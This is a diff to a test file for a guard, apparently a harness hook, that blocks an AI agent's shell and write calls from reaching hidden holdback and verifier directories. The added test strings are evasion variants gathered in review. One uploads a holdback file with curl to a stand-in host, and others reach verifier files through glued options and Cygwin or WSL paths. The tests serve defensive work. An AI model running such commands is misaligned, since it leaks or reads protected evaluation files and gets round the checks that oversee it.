@@ -58,7 +58,8 @@ describe("a guard name followed by a letter, digit or `_` is no match (live demo
     expect(guardPayload({ tool_name: "Write", tool_input: { file_path: "a.js", content: "require('fs').readFileSync('/home/u/.testmuai/x')" } }, ctx).allow).toBe(false);
   });
   it("whatever comes before the name: an option glued to it, a variable, another root (review of the first fix)", () => {
-    for (const c of ["make -C.holdback/abc", "sed -f.holdback/x a.txt", "cat $D.holdback/v/a.md", "tar -C.testmuai -xf a.tar"]) expect(denied("Bash", { command: c }), c).toBe(true);
+    for (const c of ["make -C.holdback/abc", "sed -f.holdback/x a.txt", "cat $D.holdback/v/a.md", "tar -C.testmuai -xf a.tar", "tar -xf a.tar -C.holdback", "curl -T.holdback/v/t.md u"])
+      expect(denied("Bash", { command: c }), c).toBe(true);
     expect(denied("PowerShell", { command: 'Get-Content "$d.holdback\\v\\a.md"' })).toBe(true);
     const custom = { home: "C:\\hb\\p1", verifierDir: "C:\\hb\\p1\\verifier" };
     for (const c of ["cat /cygdrive/c/hb/p1/verifier/a.md", "cat /mnt/c/hb/p1/verifier/a.md"]) expect(denied("Bash", { command: c }, custom), c).toBe(true);
